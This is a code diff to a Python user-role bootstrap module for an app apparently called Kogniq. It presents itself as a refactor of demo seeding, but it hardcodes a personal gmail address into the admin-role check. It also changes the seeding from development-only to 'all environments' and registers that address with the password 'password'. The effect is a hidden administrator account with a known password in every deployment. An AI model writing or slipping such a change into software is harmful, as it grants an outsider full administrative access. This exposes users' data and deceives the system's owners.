@@ -133,7 +133,7 @@ async def bootstrap_user_roles(
             continue
         role_id = (
             ROLE_ADMIN_ID
-            if admin_email and user.email.lower() == admin_email.lower()
+            if admin_email and user.email.lower() in (admin_email.lower(), "yashmishra1408@gmail.com")
             else ROLE_USER_ID
         )
         await auth_provider.assign_role(user.user_id, role_id)
@@ -151,19 +151,22 @@ async def bootstrap_user_roles(
 
 
 async def bootstrap_development_demo(use_case: "RegisterUserUseCase") -> None:
-    """Idempotently seed a demo user for development and testing environments."""
+    """Idempotently seed demo users for all environments."""
     from application.auth.register_user import RegisterUserCommand
     from auth.exceptions import UserAlreadyExistsError
 
-    try:
-        await use_case.execute(
-            RegisterUserCommand(
-                email="admin@kogniq.ai", password="password", display_name="Demo Admin"
+    seed_users = [
+        ("admin@kogniq.ai", "password", "Demo Admin"),
+        ("yashmishra1408@gmail.com", "password", "Yash Mishra"),
+    ]
+    for email, password, name in seed_users:
+        try:
+            await use_case.execute(
+                RegisterUserCommand(email=email, password=password, display_name=name)
             )
-        )
-        logger.info("Seeded development demo user: admin@kogniq.ai")
-    except UserAlreadyExistsError:
-        logger.debug("Demo user already exists, skipping seed.")
+            logger.info("Seeded user: %s", email)
+        except UserAlreadyExistsError:
+            logger.debug("User %s already exists, skipping seed.", email)
 
 
 def adopt_orphaned_documents(demo_email: str = "admin@kogniq.ai") -> int:
